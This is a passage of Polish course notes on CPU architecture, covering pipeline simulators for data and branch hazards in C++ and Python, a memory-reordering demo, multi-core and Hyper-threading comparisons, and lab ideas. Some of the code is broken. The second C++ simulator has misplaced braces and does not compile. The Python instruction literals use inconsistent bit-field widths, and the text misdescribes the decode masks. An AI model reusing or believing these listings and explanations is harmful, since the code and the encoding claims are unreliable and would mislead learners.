                        // Aktualizacja rejestrów
                        if (inst.op == "ADD") {
                            registers[inst.rd] = registers[inst.rs] + registers[inst.rt];
                        } else if (inst.op == "SUB") {
                            registers[inst.rd] = registers[inst.rs] - registers[inst.rt];
                        } else if (inst.op == "MUL") {
                            registers[inst.rd] = registers[inst.rs] * registers[inst.rt];
                        }
                    	break;
                }
            }
        }

        std::cout << "Cycle: " << ++cycles << std::endl << std::endl;
        pc++;
    }

    // Dodajemy dodatkowe cykle dla pozostałych etapów potoku
    cycles += 4;
}

int main() {
    simulatePipeline();

    std::cout << "Final register values:" << std::endl;
    for (const auto& reg : registers) {
        std::cout << reg.first << ": " << reg.second << std::endl;
    }

    return 0;
}
```

Powyższy symulator wykonuje sekwencję rozkazów (program) na prostym procesorze. Wprowadza wstrzymanie (stalling) potoku, gdy wykryje hazard danych, co pozwala na zaktualizowanie wartości rejestru przed przekazaniem go do kolejnego rozkazu. Symulator wyświetla etap potoku dla każdego rozkazu oraz numer cyklu. Po zakończeniu symulacji wyświetlane są końcowe wartości rejestrów procesora.

### Drugi

Symulator prostego procesora z uwzględnieniem hazardu kontroli (branch hazard). Procesor ten ma prosty potok rozkazów o pięciu etapach: pobieranie rozkazu (IF), dekodowanie (ID), wykonanie (EX), dostęp do pamięci (MEM) i zapis wyniku (WB).

Zakładamy, że procesor obsługuje jedynie trzy rozkazy: dodawanie, odejmowanie i skok warunkowy (z wykorzystaniem instrukcji warunkowej "beq"). Dla uproszczenia, przyjmujemy, że skok warunkowy wykonywany jest tylko, gdy pierwszy argument jest równy zeru.

#### wersja C++

``` C++
#include <iostream>
#include <vector>
#include <string>
#include <map>

// Struktura rozkazu
struct Instruction {
    std::string op;
    std::string rd, rs, rt;
    bool is_branch; // Flaga, czy rozkaz to skok warunkowy
    int branch_target; // Adres docelowy skoku warunkowego
};

// Przykład programu z potencjalnym hazardem kontroli
std::vector<Instruction> program = {
    {"ADD", "R1", "R2", "R3", false, 0},
    {"SUB", "R4", "R1", "R5", false, 0},
    {"BEQ", "R1", "R0", "label", true, 4},
    {"ADD", "R6", "R7", "R8", false, 0},
    {"label", "", "", "", false, 0},
    {"ADD", "R9", "R10", "R11", false, 0},
};

// Rejestry procesora
std::map<std::string, int> registers = {
    {"R0", 0},
    {"R1", 1},
    {"R2", 2},
    {"R3", 3},
    {"R4", 4},
    {"R5", 5},
    {"R6", 6},
    {"R7", 7},
    {"R8", 8},
    {"R9", 9},
    {"R10", 10},
    {"R11", 11},
};

// Symulacja potoku rozkazowego z obsługą hazardu kontroli
void simulatePipeline() {
    int pc = 0;
    int cycles = 0;
    int num_instructions = program.size();
    bool is_branch_taken = false;

    while (pc < num_instructions) {
        // Symulacja potoku rozkazowego
        for (int i = 0; i < 5; ++i) {
            // Jeśli etap jest wykonywany dla ważnego rozkazu
            if (pc - i >= 0 && pc - i < num_instructions) {
                Instruction inst = program[pc - i];

                switch (i) {
                    case 0: // IF - pobieranie rozkazu
                        std::cout << "IF: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
                        break;
                    case 1: // ID - dekodowanie
                        std::cout << "ID: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
                    // Wstrzymujemy potok, jeśli występuje hazard kontroli
                    if (i < num_instructions - 1 && inst.is_branch && is_branch_taken) {
                        std::cout << "Stalling due to branch hazard" << std::endl;
                        --pc;
                        break;
                    }
                    break;
                case 2: // EX - wykonanie
                    std::cout << "EX: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
                    // Sprawdzamy, czy występuje skok warunkowy
                    if (inst.is_branch && registers[inst.rd] == 0) {
                        pc = inst.branch_target;
                        is_branch_taken = true;
                    } else {
                        is_branch_taken = false;
                    }
                    break;
                case 3: // MEM - dostęp do pamięci
                    std::cout << "MEM: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
                    break;
                case 4: // WB - zapis wyniku
                    std::cout << "WB: " << inst.op << " " << inst.rd << ", " << inst.rs << ", " << inst.rt << std::endl;
                    // Aktualizacja rejestrów
                    if (inst.op == "ADD") {
                        registers[inst.rd] = registers[inst.rs] + registers[inst.rt];
                    } else if (inst.op == "SUB") {
                        registers[inst.rd] = registers[inst.rs] - registers[inst.rt];
                    }
                    break;
            }
        }
    }

    std::cout << "Cycle: " << ++cycles << std::endl << std::endl;
    pc++;
}

// Dodajemy dodatkowe cykle dla pozostałych etapów potoku
cycles += 4;
}

int main() {
	simulatePipeline();

	std::cout << "Final register values:" << std::endl;
	for (const auto& reg : registers) {
    	std::cout << reg.first << ": " << reg.second << std::endl;
	}

return 0;
```

Symulator wykonuje sekwencję rozkazów na prostym procesorze z potokiem rozkazowym. Wprowadza wstrzymanie (stalling) potoku, gdy wykryje hazard kontroli (branch hazard), co pozwala na zaktualizowanie wartości PC przed pobraniem kolejnego rozkazu. Symulator wyświetla etap potoku dla każdego rozkazu oraz numer cyklu. Po zakończeniu symulacji wyświetlane są końcowe wartości rejestrów procesora.

#### wersja Python

``` python
class SimpleProcessor:
    def __init__(self):
        self.memory = [0] * 1024
        self.registers = [0] * 32
        self.PC = 0
        self.pipeline = [None] * 5

    def load_program(self, program):
        for i, instruction in enumerate(program):
            self.memory[i] = instruction

    def fetch(self):
        if self.PC < len(self.memory):
            instruction = self.memory[self.PC]
            self.PC += 4
            return instruction
        return None

    def decode(self, instruction):
        opcode = (instruction >> 26) & 0x3F
        rs = (instruction >> 21) & 0x1F
        rt = (instruction >> 16) & 0x1F
        rd = (instruction >> 11) & 0x1F
        imm = instruction & 0xFFFF
        return opcode, rs, rt, rd, imm

    def execute(self, opcode, rs, rt, rd, imm):
        if opcode == 0:  # add
            self.registers[rd] = self.registers[rs] + self.registers[rt]
        elif opcode == 1:  # sub
            self.registers[rd] = self.registers[rs] - self.registers[rt]
        elif opcode == 2:  # beq, 
        	# instrukcja skoku warunkowego (branch if equal), procesor sprawdza, 
        	# czy wartość pierwszego rejestru źródłowego (rs) jest równa zeru. 
        	# Jeśli tak, procesor przeskakuje o liczbę instrukcji określoną przez 
        	# wartość natychmiastową (imm) dodaną do aktualnej wartości licznika programu (PC).
            if self.registers[rs] == 0:
                self.PC += imm - 4
                return True
        return False

    def run(self):
        while True:
            instruction = self.fetch()
            if instruction is None:
                break

            opcode, rs, rt, rd, imm = self.decode(instruction)
            branch_taken = self.execute(opcode, rs, rt, rd, imm)

            if branch_taken:
                self.PC += 4
                self.fetch()

processor = SimpleProcessor()
program = [
    0b000000_00000_00001_00010_00000_000000,  # add $2, $0, $1
    0b000001_00000_00001_00011_000000000100,  # sub $3, $0, $1
    0b000010_00000_00000_00000_000000000100,  # beq $0, $0, 4
    0b000000_00000_00010_00011_00000_000000,  # add $3, $0, $2
]
processor.load_program(program)
processor.run()

print("Register values:")
for i, value in enumerate(processor.registers):
    print(f"${i}: {value}")
```


W przypadku instrukcji skoku warunkowego `beq` (branch if equal), procesor sprawdza, czy wartość pierwszego rejestru źródłowego (rs) jest równa zeru. Jeśli tak, procesor przeskakuje o liczbę instrukcji określoną przez wartość natychmiastową (imm) dodaną do aktualnej wartości licznika programu (PC).

Oto, co dzieje się w przypadku skoku `beq` w funkcji `execute()`:

1. Sprawdzenie, czy wartość w rejestrze `rs` jest równa zeru. Jeśli tak, procesor wykonuje skok warunkowy.
2. Aktualizacja wartości licznika programu (PC): `self.PC += imm - 4`. Odejmujemy 4, ponieważ PC zostanie zaktualizowany o 4 w funkcji `fetch()` tuż po wykonaniu instrukcji `beq`. Przez to, skok zostaje uwzględniony poprawnie.
3. Jeśli skok zostanie wykonany, zwracana jest wartość `True`, aby poinformować symulator o konieczności uwzględnienia hazardu kontroli (branch hazard). W przeciwnym przypadku zwracana jest wartość `False`.

W symulatorze, jeśli funkcja `execute()` zwróci wartość `True` (co oznacza, że skok został wykonany), następuje dodatkowy cykl `fetch()`, aby uwzględnić hazard kontroli. W ten sposób, symulator upewnia się, że kolejne instrukcje będą pobierane z właściwego miejsca w pamięci po wykonaniu skoku warunkowego.

Warto zauważyć, że w rzeczywistych procesorach z potokowym przetwarzaniem, takich jak MIPS, hazard kontroli (branch hazard) jest często rozwiązywany przez wprowadzenie opóźnień w potoku (stalls) lub przez techniki przewidywania skoków (branch prediction). W uproszczonym symulatorze te aspekty zostały pominięte dla zwięzłości i prostoty.


Funkcja `decode()` jest odpowiedzialna za dekodowanie instrukcji pobranej z pamięci przez etap IF (Instruction Fetch) potoku przetwarzania. Celem dekodowania jest wyodrębnienie informacji związanych z rozkazem, takich jak kod operacji (opcode) oraz rejestry źródłowe i docelowe.

W funkcji `decode()`, instrukcja jest przekazywana jako argument, a następnie wyodrębniane są następujące wartości:

- `opcode`: Kod operacji, który określa rodzaj instrukcji do wykonania (np. dodawanie, odejmowanie lub skok warunkowy). Wartość ta jest uzyskiwana przez przesunięcie bitów instrukcji o 26 pozycji w prawo i zastosowanie maski bitowej `0x3F` (szóstego bitu). W naszym przypadku mamy tylko 3 różne operacje, więc wystarczy 2 bity na reprezentację opkodu: `0b00` dla `add`, `0b01` dla `sub`, `0b10` dla `beq`.

- `rs`: Indeks pierwszego rejestru źródłowego. Jest to wyodrębnione przez przesunięcie bitów instrukcji o 21 pozycji w prawo i zastosowanie maski bitowej `0x1F` (piątego bitu).

- `rt`: Indeks drugiego rejestru źródłowego. Jest to wyodrębnione przez przesunięcie bitów instrukcji o 16 pozycji w prawo i zastosowanie maski bitowej `0x1F` (piątego bitu).

- `rd`: Indeks rejestru docelowego, do którego zapisany zostanie wynik operacji. Jest to wyodrębnione przez przesunięcie bitów instrukcji o 11 pozycji w prawo i zastosowanie maski bitowej `0x1F` (piątego bitu). Zmienna `rd` jest używana tylko dla instrukcji `add` i `sub`.

- `imm`: 16-bitowa wartość natychmiastowa (ang. immediate value) używana w instrukcji skoku warunkowego `beq`. Jest to wyodrębnione poprzez zastosowanie maski bitowej `0xFFFF` (szesnastego bitu) na instrukcji.

Dekodowanie instrukcji pozwala na łatwe odczytanie danych niezbędnych do wykonania operacji przez etap EX (Execute) potoku przetwarzania.


### Wersja z branch prediction:

``` python
class SimpleProcessor:
    def __init__(self):
        self.memory = [0] * 1024
        self.registers = [0] * 32
        self.PC = 0
        self.stall_count = 0
        self.branch_prediction_always_taken = True

    def load_program(self, program):
        for i, instruction in enumerate(program):
            self.memory[i] = instruction

    def fetch(self):
        if self.PC < len(self.memory):
            instruction = self.memory[self.PC]
            self.PC += 4
            return instruction
        return None

    def decode(self, instruction):
        opcode = (instruction >> 26) & 0x3F
        rs = (instruction >> 21) & 0x1F
        rt = (instruction >> 16) & 0x1F
        rd = (instruction >> 11) & 0x1F
        imm = instruction & 0xFFFF
        return opcode, rs, rt, rd, imm

    def execute(self, opcode, rs, rt, rd, imm):
        if opcode == 0:  # add
            self.registers[rd] = self.registers[rs] + self.registers[rt]
        elif opcode == 1:  # sub
            self.registers[rd] = self.registers[rs] - self.registers[rt]
        elif opcode == 2:  # beq
            if self.registers[rs] == 0:
                self.PC += imm - 4
                return True
        return False

    def handle_branch_hazard(self):
        if self.stall_count > 0:
            self.stall_count -= 1
        else:
            instruction = self.fetch()
            if instruction is None:
                return

            opcode, rs, rt, rd, imm = self.decode(instruction)
            branch_taken = self.execute(opcode, rs, rt, rd, imm)

            if opcode == 2:  # beq
                if self.branch_prediction_always_taken:
                    if not branch_taken:
                        self.stall_count = 1
                else:
                    if branch_taken:
                        self.stall_count = 1

    def run(self):
        while True:
            self.handle_branch_hazard()
            if self.PC >= len(self.memory) and self.stall_count == 0:
                break

processor = SimpleProcessor()
program = [
    0b000000_00000_00001_00010_00000_000000,  # add $2, $0, $1
    0b000001_00000_00001_00011_000000000100,  # sub $3, $0, $1
    0b000010_00000_00000_00000_000000000100,  # beq $0, $0, 4
    0b000000_00000_00010_00011_00000_000000,  # add $3, $0, $2
]
processor.load_program(program)
processor.run()

print("Register values:")
for i, value in enumerate(processor.registers):
    print(f"${i}: {value}")
```

W powyższym kodzie symulatora prostego procesora uwzględniono opóźnienie w potoku (stall) oraz prostą technikę przewidywania skoków (branch prediction). 

<!-- 
1. Dodano zmienną `self.stall_count` do przechowywania liczby cykli opóźnienia potoku (stalls) oraz zmienną `self.branch_prediction_always_taken` do określenia polityki przewidywania skoków.

2. Zastąpiono funkcję `run()` funkcją `handle_branch_hazard()`, która teraz obsługuje cały proces wykonywania instrukcji, w tym hazard kontroli. Funkcja ta:
    1. Sprawdza, czy występują opóźnienia w potoku (stalls) i zmniejsza ich liczbę, jeśli tak.
    2. Pobiera, dekoduje i wykonuje instrukcje.
    3. Obsługuje hazard kontroli dla instrukcji `beq`, sprawdzając politykę przewidywania skoków, a następnie wprowadza opóźnienie w potoku (stall), jeśli przewidywanie było błędne.

3. Zmodyfikowano funkcję `run()`, która teraz korzysta z funkcji `handle_branch_hazard()` do iteracyjnego wykonywania instrukcji. Funkcja `run()` kończy działanie, gdy licznik programu (PC) przekroczy długość pamięci, a liczba opóźnień w potoku wyniesie 0.

W wyniku tych zmian, zmodyfikowany symulator uwzględnia opóźnienia w potoku (stalls) oraz przewidywanie skoków (branch prediction). Warto zauważyć, że w rzeczywistych procesorach przewidywanie skoków może być znacznie bardziej zaawansowane, z użyciem dynamicznych technik, takich jak bufor przewidywania skoków (branch target buffer) czy tablica historii skoków (branch history table). W uproszczonym symulatorze używamy prostej, statycznej polityki przewidywania "zawsze wykonuj skok" dla celów demonstracyjnych. -->

# Instruction reordering

Uwaga: Warto zauważyć, że efekty takie jak reordering instrukcji są zależne od architektury procesora, a w przypadku niektórych implementacji może być trudno uzyskać te efekty w sposób powtarzalny.

Oto prosty program w C++, który ilustruje reordering instrukcji na procesorze x86:

```cpp
#include <atomic>
#include <iostream>
#include <thread>
#include <vector>

std::atomic<int> x{0}, y{0};
std::atomic<int> count{0};

void write_values() {
    for (int i = 0; i < 100000; ++i) {
        x.store(1, std::memory_order_relaxed);
        y.store(1, std::memory_order_relaxed);
    }
}

void read_values() {
    for (int i = 0; i < 100000; ++i) {
        int r1 = y.load(std::memory_order_relaxed);
        int r2 = x.load(std::memory_order_relaxed);
        if (r1 == 1 && r2 == 0) {
            count.fetch_add(1, std::memory_order_relaxed);
        }
    }
}

int main() {
    int num_iterations = 100;
    int reorderings = 0;

    for (int i = 0; i < num_iterations; ++i) {
        x.store(0, std::memory_order_relaxed);
        y.store(0, std::memory_order_relaxed);

        std::thread t1(write_values);
        std::thread t2(read_values);

        t1.join();
        t2.join();

        reorderings += count.load(std::memory_order_relaxed);
        count.store(0, std::memory_order_relaxed);
    }

    std::cout << "Liczba reorderingow instrukcji po " << num_iterations << " iteracjach: " << reorderings << std::endl;

    return 0;
}
```

W tym programie używamy dwóch zmiennych atomowych `x` i `y`, które są inicjowane wartością 0. Wątek `t1` zapisuje wartość 1 do `x` i `y`, podczas gdy wątek `t2` wczytuje wartości `y` i `x`. Używamy relaksowanej kolejności pamięci (`std::memory_order_relaxed`), która pozwala na reordering instrukcji.

Jeśli procesor przestawi kolejność instrukcji w taki sposób, że odczyt `y` zostanie wykonany przed odczytem `x`, program zlicza taką sytuację jako reordering.

Po wielokrotnym uruchomieniu programu liczba reorderingów może być różna. Procesor x86 ma silną kolejność pamięci, więc reordering instrukcji może być rzadko spotykany. Przetestuj ten program na różnych konfiguracjach sprzętowych, aby zobaczyć, jak efekty reorderingu instrukcji różnią się w zależności od sprzętu.

> Ref: 
> - [Memory Reordering Caught in the Act](https://preshing.com/20120515/memory-reordering-caught-in-the-act/)
> - [The Purpose of memory_order_consume in C++11](https://preshing.com/20140709/the-purpose-of-memory_order_consume-in-cpp11/)

# Porównanie jedno- i wielordzeniowych procesorów:
## Różnice  

Jednordzeniowe i wielordzeniowe procesory to dwa różne typy układów scalonych stosowanych w komputerach. Definicje, zalety i wady każdego z nich.

**Jednordzeniowy procesor (single-core processor)**

Definicja: Procesor jednordzeniowy to układ scalony z jednym rdzeniem CPU, który może wykonywać tylko jedną instrukcję na raz.

Zalety:
- Mniejsza złożoność układu: Jednordzeniowe procesory są mniej skomplikowane w porównaniu do wielordzeniowych, co może prowadzić do mniejszego zużycia energii i niższych kosztów produkcji.
- Łatwiejsza implementacja: Programowanie dla jednordzeniowych procesorów jest prostsze, ponieważ nie ma konieczności zarządzania równoczesnością.

Wady:
- Niska wydajność: W przypadku zadań wielowątkowych, jednordzeniowe procesory mają niższą wydajność niż ich wielordzeniowe odpowiedniki, ponieważ mogą wykonywać tylko jedno zadanie na raz.
- Szybsze osiąganie limitów wydajności: Ponieważ jednordzeniowe procesory mają tylko jeden rdzeń, mogą szybciej osiągnąć swoje limity wydajności, co prowadzi do niższej wydajności w porównaniu do wielordzeniowych procesorów.

Przykład w C++:

```cpp
#include <iostream>

int main() {
    int a = 5, b = 3, c;
    c = a + b;
    std::cout << "Suma: " << c << std::endl;
    return 0;
}
```

**Wielordzeniowy procesor (multi-core processor)**

Definicja: Wielordzeniowy procesor to układ scalony z dwoma lub więcej rdzeniami CPU, które mogą równocześnie wykonywać wiele instrukcji.

Zalety:
- Wyższa wydajność: Wielordzeniowe procesory są bardziej wydajne dla zadań wielowątkowych, ponieważ mogą równocześnie wykonywać wiele zadań.
- Skalowalność: Wielordzeniowe procesory mogą być łatwiej skalowane, co prowadzi do wyższej wydajności w porównaniu do jednordzeniowych procesorów.
- Energooszczędność: W przypadku zastosowań o małym obciążeniu, wielordzeniowe procesory mogą oszczędzać energię poprzez wyłączanie nieużywanych rdzeni.

Wady:
- Wyższa złożoność układu: Wielordzeniowe procesory są bardziej skomplikowane niż jednordzeniowe, co może prowadzić do wyższego zużycia energii i wyższych kosztów produkcji.
- Trudniejsza implementacja: Programowanie dla wielordzeniowych procesorów może być trudniejsze, ponieważ wymaga zarządzania równoczesnością i synchronizacją między wątkami.

Przykład w C++:

```cpp
#include <iostream>
#include <thread>

void add(int a, int b) {
    int c = a + b;
    std::cout << "Suma: " << c << std::endl;
}

void sub(int a, int b) {
    int c = a - b;
    std::cout << "Różnica: " << c << std::endl;
}

int main() {
    int a = 5, b = 3;

    std::thread thread1(add, a, b);
    std::thread thread2(sub, a, b);

    thread1.join();
    thread2.join();

    return 0;
}
```

W powyższym przykładzie używamy biblioteki `<thread>` w języku C++ do tworzenia dwóch wątków, które wykonują funkcje `add()` i `sub()` równocześnie na wielordzeniowym procesorze. Dzięki temu można równocześnie obliczyć sumę i różnicę dwóch liczb, co pokazuje zaletę wielordzeniowego procesora w porównaniu do jednordzeniowego procesora.

Jednordzeniowe procesory są prostsze, ale mniej wydajne, szczególnie w przypadku zadań wielowątkowych. Wielordzeniowe procesory oferują wyższą wydajność dla zadań wielowątkowych, ale wymagają bardziej zaawansowanego zarządzania równoczesnością i synchronizacją w kodzie programu. Wybór pomiędzy nimi zależy od konkretnych wymagań i ograniczeń projektu.

> **_UWAGA:_** Problem wyścigu (race condition)

> Ref:
> - [Make Your Program Slower With Threads](https://brooker.co.za/blog/2014/12/06/random.html)

## Hyper-threading

Hyper-threading to technologia opracowana przez firmę Intel, która pozwala na wykonywanie dwóch lub więcej wątków na jednym rdzeniu procesora, zwiększając wydajność procesora w zadaniach wielowątkowych. Technologia ta polega na tym, że jeden rdzeń procesora posiada dwa lub więcej zestawów rejestrów, które są niezależne dla każdego wątku. Dzięki temu rdzeń może wykonywać wiele wątków równocześnie, wykorzystując jednocześnie swoje zasoby sprzętowe.

W uproszczonym procesorze z technologią Hyper-threading można uwzględnić następujące elementy:

1. Rdzeń procesora: Jednostka wykonawcza (ALU), jednostka sterująca oraz pamięć podręczna (cache). Rdzeń procesora wykonuje instrukcje z kolejnych wątków.

2. Zestawy rejestrów: Każdy wątek posiada swój własny zestaw rejestrów, takich jak licznik programu (PC) oraz rejestry ogólnego przeznaczenia. W przypadku procesora z technologią Hyper-threading, rdzeń posiada dwa lub więcej zestawów rejestrów, które są niezależne dla każdego wątku.

3. Mechanizm przemiennego wykonania instrukcji (Instruction interleaving): Procesor z technologią Hyper-threading wykonuje instrukcje z różnych wątków w sposób przemienny. Gdy jeden wątek jest zablokowany, np. na wynik operacji I/O, procesor może kontynuować wykonywanie instrukcji z innego wątku, dzięki czemu zasoby sprzętowe rdzenia są lepiej wykorzystane.

4. Mechanizm równoczesnego dekodowania (Simultaneous multithreading, SMT): Procesor z technologią Hyper-threading może równocześnie dekodować i wykonywać instrukcje z różnych wątków, co przyczynia się do zwiększenia wydajności procesora w zadaniach wielowątkowych.

5. Mechanizm zarządzania wątkami: Procesor z technologią Hyper-threading posiada mechanizm zarządzania wątkami, który kontroluje ich wykonanie, przydzielanie zasobów oraz obsługę zdarzeń, takich jak przerwania czy wyjątki.

Podsumowując, technologia Hyper-threading pozwala na efektywne wykorzystanie zasobów sprzętowych rdzenia procesora, zwiększając jego wydajność w zadaniach wielowątkowych. W procesorze z technologią Hyper-threading znajduje się rdzeń, który posiada dwa lub więcej niezależnych zestawów rejestrów, umożliwiających równoczesne wykonywanie instrukcji z różnych wątków. Procesor z Hyper-threading posiada także mechanizmy takie jak Instruction interleaving, Simultaneous multithreading (SMT) oraz zarządzanie wątkami, które kontrolują wykonanie, przydzielanie zasobów oraz obsługę zdarzeń.

Oto kilka zalet i wad technologii Hyper-threading:

Zalety:
- Zwiększona wydajność: Technologia Hyper-threading pozwala na lepsze wykorzystanie zasobów rdzenia procesora, co prowadzi do zwiększenia wydajności w zadaniach wielowątkowych.
- Lepsza przepustowość: Dzięki możliwości równoczesnego wykonywania instrukcji z różnych wątków, procesor z technologią Hyper-threading może osiągnąć wyższą przepustowość w porównaniu do procesora bez tej technologii.
- Efektywność energetyczna: Procesory z technologią Hyper-threading mogą wykorzystywać swoje zasoby sprzętowe efektywniej, co może prowadzić do oszczędności energii.

Wady:
- Zwiększona złożoność: Technologia Hyper-threading wprowadza dodatkową złożoność w architekturze procesora, co może prowadzić do wyższych kosztów produkcji i trudności w debugowaniu.
- Potencjalne problemy z synchronizacją: W przypadku równoczesnego wykonywania wielu wątków na jednym rdzeniu, mogą wystąpić problemy z synchronizacją oraz konkurencją o zasoby sprzętowe.
- Wydajność w zależności od rodzaju zadania: Technologia Hyper-threading przynosi korzyści głównie w zadaniach wielowątkowych, a jej wpływ na wydajność w zadaniach jednowątkowych może być ograniczony.

Warto zauważyć, że technologia Hyper-threading nie jest jedyną dostępną techniką SMT (Simultaneous multithreading) - inne firmy, takie jak AMD, opracowały własne technologie SMT, takie jak SMT w procesorach AMD Ryzen, które oferują podobne możliwości wykonywania wielu wątków na jednym rdzeniu procesora. W zastosowaniach praktycznych, wybór procesora z technologią Hyper-threading czy innymi technologiami SMT zależy od potrzeb konkretnego projektu oraz rodzaju zadań, które mają być realizowane.

W poniższym przykładzie przedstawiam uproszczony symulator procesora z technologią Hyper-threading. W tym przypadku zakładamy, że procesor ma jeden rdzeń i może jednocześnie wykonywać dwie operacje dodawania.


Diagram procesora z technologią Hyper-threading

```
Procesor z technologią Hyper-threading
1. Rdzeń procesora
    a. Jednostka arytmetyczno-logiczna (ALU)
    b. Rejestry
        i. Zestaw rejestrów dla wątku 1
        ii. Zestaw rejestrów dla wątku 2
    c. Pamięć podręczna (cache)
    d. Kontroler wykonania
        i. Pobieranie instrukcji
        ii. Dekodowanie instrukcji
        iii. Wykonanie instrukcji
2. Kontroler pamięci
    a. Pamięć RAM
3. Kontroler wejścia/wyjścia (I/O)
```

Symulacja działania procesora z HT

```cpp
#include <iostream>
#include <thread>
#include <vector>
#include <chrono>

class Processor {
public:
    Processor() : registers{{0, 0}, {0, 0}} {}

    void execute(int thread_id, const std::string &operation, int a, int b) {
        if (operation == "add") {
            registers[thread_id][0] = a;
            registers[thread_id][1] = b;
            int result = add(thread_id);
            std::cout << "Wątek " << thread_id << ": " << a << " + " << b << " = " << result << std::endl;
        } else {
            std::cout << "Wątek " << thread_id << ": Nieznana operacja " << operation << std::endl;
        }
    }

private:
    int add(int thread_id) {
        std::this_thread::sleep_for(std::chrono::seconds(1)); // Symulacja czasu wykonania operacji
        return registers[thread_id][0] + registers[thread_id][1];
    }

    int registers[2][2]; // Rejestry dla dwóch wątków
};

void task(Processor &processor, int thread_id, const std::string &operation, int a, int b) {
    processor.execute(thread_id, operation, a, b);
}

int main() {
    Processor processor;

    // Przykład zadań do wykonania
    std::vector<std::tuple<int, std::string, int, int>> tasks = {
        {0, "add", 3, 5},
        {1, "add", 7, 2}
    };

    std::vector<std::thread> threads;
    for (const auto &task_args : tasks) {
        threads.emplace_back(task, std::ref(processor), std::get<0>(task_args), std::get<1>(task_args), std::get<2>(task_args), std::get<3>(task_args));
    }

    for (auto &thread : threads) {
        thread.join();
    }

    return 0;
}
```

W powyższym kodzie, klasa `Processor` symuluje prosty procesor z technologią Hyper-threading. Ma jeden rdzeń, który może wykonywać operacje dodawania. Rejestry są podzielone na dwa zestawy, po jednym dla każdego wątku. W funkcji `execute`, procesor dekoduje i wykonuje operacje na podstawie identyfikatora wątku.

W funkcji `main`, tworzymy dwa wątki, które wykonują operacje dodawania równocześnie. Dzięki temu symulator ilustruje, jak procesor z technologią Hyper-threading może wykonywać wiele wątków na jednym rdzeniu procesora.

## Scenariusz problemu i porównanie rozwiązania na procesorze jedno- i wielordzeniowym.

Scenariusz problemu:
Przyjmijmy, że chcemy obliczyć wartości silni dla dużego zestawu liczb. Obliczenia te mają być wykonane sekwencyjnie dla każdej liczby w zestawie. Wartości silni obliczane są za pomocą iteracyjnej funkcji silni.

Porównanie rozwiązań na procesorze jedno- i wielordzeniowym:

1. Procesor jednordzeniowy:
W przypadku procesora jednordzeniowego, wszystkie obliczenia muszą być wykonane sekwencyjnie, jeden zestaw obliczeń po drugim. Procesor wykonuje obliczenia w jednym wątku, co prowadzi do pełnego wykorzystania rdzenia tylko wtedy, gdy obciążenie jest ciągłe.

Zalety:
- Mniejsza złożoność programowania, brak konieczności zarządzania wątkami.
- W przypadku małych zestawów danych, czas wykonania może być akceptowalny.

Wady:
- Dłuższy czas wykonania obliczeń, zwłaszcza przy dużych zestawach danych.
- Brak możliwości równoczesnego wykonywania zadań, co może prowadzić do marnowania zasobów procesora.

2. Procesor wielordzeniowy:
W przypadku procesora wielordzeniowego, obliczenia mogą być równocześnie wykonywane na różnych rdzeniach, co pozwala na równoległe przetwarzanie danych. Wątki mogą być dynamicznie przydzielane do rdzeni, co pozwala na równoczesne obliczenia wartości silni dla różnych liczb.

Zalety:
- Krótszy czas wykonania obliczeń dzięki równoległemu przetwarzaniu.
- Lepsze wykorzystanie zasobów procesora, zwłaszcza przy dużych zestawach danych.
- Możliwość równoczesnego wykonywania różnych zadań, co prowadzi do większej efektywności.

Wady:
- Większa złożoność programowania związana z zarządzaniem wątkami i synchronizacją.
- Potrzeba odpowiedniego podziału danych i zbalansowania obciążenia między rdzeniami.

Podsumowując, w przypadku obliczania wartości silni dla dużego zestawu liczb, procesor wielordzeniowy może zapewnić znacznie lepszą wydajność niż procesor jednordzeniowy, ze względu na możliwość równoległego przetwarzania danych. Jednakże, wymaga to większej złożoności programowania związanej z zarządzaniem wątkami i synchronizacją, co może być trudniejsze do osiągnięcia niż w przypadku procesora jednordzeniowego.

## Pomysły na dodatkowe zajęcia

- Omów wyzwania związane z programowaniem wielowątkowym, takie jak synchronizacja, wyścigi (race conditions) i blokady (deadlocks)

- Studium przypadku:
	- Rzeczywisty procesor, na przykład Intel Core i7 lub AMD Ryzen - analiza jego architektury, cyklu rozkazowego i potoku rozkazowego.
	- Zadanie z optymalizacją: Sposoby optymalizacji potoku rozkazowego dla wybranego procesora, uwzględniając możliwe hazardy.
	- Przeprowadzenie eksperymentów z programami i porównanie wydajności na różnych konfiguracjach procesora (jedno- i wielordzeniowych).

- Laboratorium z mikrokontrolerów:
	- Zaprogramowanie prostego mikrokontrolera, takiego jak Arduino lub STM32, aby zrozumieć, jak działają cykl rozkazowy i potok rozkazowy w praktyce.
	- Zadanie z analizą: analiza wykonywania programu na mikrokontrolerze, uwzględniając opóźnienia wynikające z cyklu rozkazowego i potoku rozkazowego.
	- Optymalizacja programu na mikrokontrolerze, zmniejszając ilość cykli rozkazowych potrzebnych do wykonania zadania.

- Symulacja architektur procesorów:
	- Symulatory architektur procesorów, takie jak SimpleScalar, Gem5 lub QEMU.
	- Uruchomienie prostego programu na symulatorze i analiza wyników w kontekście cyklu rozkazowego i potoku rozkazowego.
	- Zadanie z eksploracją: Eksperymentowanie z różnymi konfiguracjami potoku rozkazowego, takimi jak liczba etapów, buforów czy też rozwiązania hazardów, aby zobaczyć, jak wpłyną na wydajność.

	> Ref:
	>	[Installing gem5 simulator on Windows WSL2](https://gist.github.com/rajesh-s/bd123ca1e65b95eb38220cd944670e3a)

- Analiza wydajności i skalowania:
	- Analiza wydajności programów na różnych konfiguracjach procesorów, takich jak jedno- i wielordzeniowe, a także o ocena wpływu potoku rozkazowego na wyniki.
	- Analiza skalowania programów na różnych konfiguracjach procesorów, szczególnie w przypadku programów wielowątkowych, i ocenę wpływu potoku rozkazowego na skalowanie.


# Komunikacja z pamięcią - alokacja i odczyt pamięci

> Ref:
> - [What Every Programmer Should Know About Memory](https://akkadia.org/drepper/cpumemory.pdf)

## Nomenklatura

Level 1 data cache - 48 kB, 12 way, 64 sets, 64 B line size, latency 5, per core

1. 48 kB: The size of the L1 data cache is 48 kilobytes. This is the total amount of data that can be stored in the cache. Smaller caches are faster but can store less data, while larger caches can store more data but may be slower.

2. 12 way: This refers to the cache's associativity, which determines how cache lines can be mapped to cache sets. In a 12-way associative cache, each cache set can hold 12 different cache lines. Higher associativity can reduce the likelihood of cache conflicts (when multiple cache lines map to the same cache set), but may increase access latency.

